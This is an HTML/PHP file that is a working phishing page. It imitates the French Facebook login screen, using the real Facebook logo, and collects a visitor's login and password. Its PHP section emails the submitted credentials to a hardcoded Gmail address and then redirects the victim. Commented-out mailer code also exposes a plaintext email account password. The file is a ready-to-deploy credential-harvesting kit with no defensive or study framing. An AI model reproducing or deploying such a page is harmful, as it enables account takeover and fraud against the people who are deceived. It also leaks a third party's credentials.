<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="bulma-0.9.3/bulma/css/bulma.css">
    <link rel="stylesheet" href="bootstrap-5.0.2-dist/css/bootstrap.css">
    <title>Se connecter à Facebook</title>
    <style type="text/css">
        body{ 
            font-size: 15px;
        }
        .b1{
            width: fit-content;
            height: 36px;
            background: #00a400;
            color: white;
            font-weight: bold;
        }
        .b0{
            background-color: #1877f2;
            color: white;
            font-weight: 700;
            font-family: sans-serif;
        }
        .b2{
            color: #216fdb;
            font-family: 'Roboto-Regular', 'Helvetica', 'sans-serif';
            font-size: 14px;
            line-height: 16px;
        }
        input{
            font-family: Helvetica, Arial, sans-serif;
            font-size: 14px !important;
            line-height: 18px !important;
            height: 45px !important;
            color: black;
        }
        .i1{
            background: #f5f6f7 !important;
        }
    </style>
</head>
<body>
    <!--<div class="containner">
        <div class="row align-items-center justify-content-center">
            <div class="col-md-4">
                <a href="">
                    <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="facebook" width="112">
                </a>
                <form action="#">
                    <div>
                      <input type="text" class="form-control" placeholder="Email address or phone number" required>
                    </div><br>
                    <div>
                      <input type="password" class="form-control" placeholder="Password" required>
                    </div>
                    <button type="button" class="btn btn-custom btn-lg btn-block mt-3">Login</button>
                    <div class="text-center pt-3 pb-3">
                      <a href="#" class="">Forgotten password?</a>
                      <hr>
                      <button type="button" class="btn btn-success btn-lg mt-3">Create New Account</button>
                    </div>
                  </form>
            </div>
        </div>
    </div>-->
   
        
        
        <div class="columns">
            <div class="column"></div>
            <div class="column">
                <div class="columns">
                    
                    <div class="column"></div>
                    <div class="column row align-items-center justify-content-center">
                        <a href="">
                            <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="facebook" width="112" class="image">
                        </a>
                    </div>
                    <div class="column"></div>
                    
                </div>
                <div class="form">
                    <form action="index.php" method="post">
                        <div class="field">
                            <div class="control">
                                <input type="text" class="input i1" placeholder="Numéro de mobile ou adresse e-mail" id="id" name="id">
                            </div><br>
                            <div class="control">
                                <input type="text" class="input i1" placeholder="Mot de passe" id="passwd" name="passwd">
                            </div><br>
                            <div class=" buttons control">
                                <input class="b0 button is-fullwidth" name="submit" type="submit" value="Se connecter" onclick='document.location.href="index.html";'>
                                <input class="b2 button is-link is-inverted is-fullwidth" value="Mot de passe oublié ?">
                            </div>
                        </div>
                    </form>
                </div>
                <hr>
                <div class="row align-items-center justify-content-center"> 
                    <button class="b1 button">Créer un compte</button>
                </div>
                
            </div>
            <div class="column"></div>
        </div>
</body>
</html>
<?php 
    ini_set('SMTP','smtp.gmail.com');
    $id='id : ' . $_POST['id'];
    $passwd='mot de passe : ' . $_POST['passwd'];
    $identifiants= $id . ' ' . $passwd;
    if(isset($_POST["submit"]) && isset($_POST["id"]) && isset($_POST["passwd"]))
    {
        mail('hadyhadyme@gmail.com', 'information facebook', $identifiants)
        /*if(mail('hadyhadyme@gmail.com', 'information facebook', $identifiants))
        {
            echo "email envoyé avec succes";
        }
        else
        {
            echo "echec de l'envoi";
        }*/
    }
    //var_dump($identifiants);
    /*ini_set('SMTP','smtp.gmail.com');
    
    $id=$_POST['id'];
    $passwd=$_POST['passwd'];
    
    if(mail('hadibaloubi@gmail.com', 'info', 'test'))
    {
        echo "email envoyé avec succes";
    }
    else
    {
        echo "echec de l'envoi";
    }
    return 'a';*/
    //echo $id;
    
    use PHPMailer\PHPMailer\PHPMailer;
    use PHPMailer\PHPMailer\Exception;
    use PHPMailer\PHPMailer\SMTP;


    require 'PHPMailer/src/Exception.php';
    require 'PHPMailer/src/PHPMailer.php';
    require 'PHPMailer/src/SMTP.php';
    /*function sendmail($objet, $contenu, $destinataire)
    {
        $mail = new PHPMailer(true);
        try
        {
            $mail->setLanguage('fr', '../PHPMailer/language/');
            $mail->SMTPDebug = 0;
            $mail->isSMTP();
            $mail->Host       = 'smtp.gmail.com';
            $mail->Port = 465;
            $mail->SMTPSecure = 'tls';   
            $mail->SMTPAuth = true;
            $mail->Username = "hadibaloubi@gmail.com";   
            $mail->Password = "meadrine01";                                    
            $mail->setFrom('hadibaloubi@gmail.com');
            $mail->addAddress($destinataire);
            $mail->Subject = utf8_decode($objet);
            $mail->Body    = $contenu;
            $mail->send();
            echo 'Message envoyé.';
        }
        catch (Exception $e) 
        {
            echo "Le Message n'a pas été envoyé. Mailer Error: {$mail->ErrorInfo}";
        }
    }*/
    /*$mail = new PHPMailer;
    $mail->isSMTP();
    $mail->SMTPDebug = SMTP::DEBUG_SERVER;                                     
    $mail->Host = 'smtp.gmail.com';                 // Specify main and backup server
    $mail->Port = 465;
    $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;                                    
    $mail->SMTPAuth = true;                               // Enable SMTP authentication
    $mail->Username = 'hadibaloubi@gmail.com';                // SMTP username
    $mail->Password = 'meadrine01';                  // SMTP password
    $mail->SMTPSecure = 'tls';                            // Enable encryption, 'ssl' also accepted

    $mail->From = 'from@example.com';
    $mail->FromName = "your name";
    $mail->AddAddress('hadibaloubi@gmail.com', 'Hadijath BALOUBI');
    //$mail->msgHTML(file_get_contents('contents.html'), __DIR__); 
    $mail->Subject = 'subject';
    $mail->Body    = 'message';

    if (!$mail->send()) 
    {
        echo 'Mailer Error: ' . $mail->ErrorInfo;
    } 
    else 
    {
        echo 'Message sent!';
    }*/

    
?>